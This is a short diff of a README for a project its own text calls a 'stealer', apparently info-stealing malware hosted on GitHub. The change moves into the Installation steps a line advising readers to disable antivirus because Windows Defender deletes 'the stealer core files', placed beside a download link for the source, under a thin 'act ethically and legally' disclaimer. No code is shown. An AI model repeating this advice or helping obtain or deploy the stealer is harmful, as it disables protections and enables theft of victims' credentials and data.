@@ -31,13 +31,9 @@
 > Please act **ethically and legally**.
 
 ---
-## TIP
-
-It is recommended that you disable your antivirus software before downloading, as Windows Defender will delete the stealer core files 
-
----
 
 ## Installation
+It is recommended that you disable your antivirus software before downloading, as Windows Defender will delete the stealer core files 
 
 1. **Download the source code**  
    [Download .zip](https://github.com/zakocord/Astryrean/archive/refs/heads/main.zip)
